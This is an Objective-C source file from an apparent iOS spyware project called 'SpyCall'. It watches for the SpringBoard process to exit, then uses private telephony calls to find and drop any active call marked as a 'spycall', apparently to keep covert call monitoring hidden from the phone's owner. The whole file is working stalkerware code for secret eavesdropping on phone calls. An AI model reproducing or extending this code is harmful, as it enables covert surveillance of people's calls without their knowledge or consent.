//
//  SpringBoardKilledNotifier.m
//  SpyCall
//
//  Created by Khaneid Hantanasiriskul on 1/6/2559 BE.
//
//

#import "SpringBoardKilledNotifier.h"
#import "RecentCallNotifier.h"
#import "SystemUtilsImpl.h"
#import "DefStd.h"
#import "Telephony.h"

#include <sys/event.h>
#import <pthread.h>

static void NoteExitKQueueCallback(
                                   CFFileDescriptorRef f,
                                   CFOptionFlags       callBackTypes,
                                   void *              info
                                   );

@implementation SpringBoardKilledNotifier

@synthesize mRecentCallNotifier;

pthread_mutex_t _currentCallsMutex2 = PTHREAD_MUTEX_INITIALIZER;

- (id) initWithNotifier: (RecentCallNotifier *) aNotifier {
    self = [super init];
    if (self != nil) {
        mRecentCallNotifier = aNotifier;
    }
    return self;
}

#pragma mark -
#pragma mark SpringBoard

// This method is aimed to register for the notification from SpringBaord
- (void) registerSpringBoardNotification {
    DLog(@">>>>>>>>>>>>>>>>>> registerSpringBoardNotification for spycall");
    
    pid_t gTargetPID = -1;
    
    SystemUtilsImpl *sysUtil = [[SystemUtilsImpl alloc] init];
    NSArray *processes = [sysUtil getRunnigProcess];		// an array of dictionary
    DLog (@"runningApplicationDictArray: %@", processes)
    [sysUtil release];
    sysUtil = nil;
    
    for (NSDictionary *pInfo in processes) {
        if ([[pInfo objectForKey:kRunningProcessNameTag] isEqualToString:@"SpringBoard"]) {
            gTargetPID = [(NSString *)[pInfo objectForKey:kRunningProcessIDTag] intValue];
            DLog(@"Found process ID");
            break;
        }
    }
    DLog(@"gTargetPID = %d", gTargetPID);
    
    // https://developer.apple.com/library/mac/technotes/tn2050/_index.html
    //FILE *                  f;
    int                     kq;
    struct kevent           changes;
    CFFileDescriptorContext context = { 0, self, NULL, NULL, NULL };
    CFRunLoopSourceRef      rls;
    
    // Create the kqueue and set it up to watch for SIGCHLD. Use the
    // new-in-10.5 EV_RECEIPT flag to ensure that we get what we expect.
    
    kq = kqueue();
    
    EV_SET(&changes, gTargetPID, EVFILT_PROC, EV_ADD | EV_RECEIPT, NOTE_EXIT, 0, NULL);
    (void) kevent(kq, &changes, 1, &changes, 1, NULL);
    
    // Wrap the kqueue in a CFFileDescriptor (new in Mac OS X 10.5!). Then
    // create a run-loop source from the CFFileDescriptor and add that to the
    // runloop.
    
    CFFileDescriptorRef noteExitKQueueRef = CFFileDescriptorCreate(NULL, kq, true, NoteExitKQueueCallback, &context);
    rls = CFFileDescriptorCreateRunLoopSource(NULL, noteExitKQueueRef, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), rls, kCFRunLoopDefaultMode);
    CFRelease(rls);
    
    CFFileDescriptorEnableCallBacks(noteExitKQueueRef, kCFFileDescriptorReadCallBack);
    mNoteExitKQueueRef = noteExitKQueueRef;
}

static void NoteExitKQueueCallback(CFFileDescriptorRef f,
                                   CFOptionFlags       callBackTypes,
                                   void *              info)
{
    struct kevent   event;
    
    (void) kevent( CFFileDescriptorGetNativeDescriptor(f), NULL, 0, &event, 1, NULL);
    
    DLog(@"Process terminated %d", (int) (pid_t) event.ident);
    
    // You've been notified!
    pthread_mutex_lock(&_currentCallsMutex2); // Fixing crash: Segmentation fault: 11 in SpringBoard
    NSArray *calls = CTCopyCurrentCalls();
    pthread_mutex_unlock(&_currentCallsMutex2);
    
    for (NSInteger i = 0; i < [calls count]; i++) {
        CTCall *call = (CTCall *)[calls objectAtIndex:i];
        DLog (@"call object %@", call)
        NSString *caller = CTCallCopyAddress(NULL, call);
        DLog (@">> caller number %@", caller);
        [caller autorelease];
        
        SpringBoardKilledNotifier *mySelf = (SpringBoardKilledNotifier *)info;
        if ([mySelf.mRecentCallNotifier isSpyCall:call]) {
            DLog (@"!!! This is SPYCALL, so disconnect the call")
            CTCallDisconnect(call);
        } else {
            DLog (@"!!! This is not spycall")
        }
    }
    
    [NSThread sleepForTimeInterval:2]; // Delay 2 seconds before re-register new notification
    SpringBoardKilledNotifier *mySelf = (SpringBoardKilledNotifier *)info;
    [mySelf unregisterSpringBoardNotification];
    [mySelf registerSpringBoardNotification];
}

- (void) unregisterSpringBoardNotification
{
    if (mNoteExitKQueueRef) {
        CFFileDescriptorDisableCallBacks(mNoteExitKQueueRef, kCFFileDescriptorReadCallBack);
        CFRelease(mNoteExitKQueueRef);
        mNoteExitKQueueRef = nil;
    }
}

- (void)dealloc
{
    [self unregisterSpringBoardNotification];
    mRecentCallNotifier = nil;
    mNoteExitKQueueRef = nil;
    [super dealloc];
}


@end
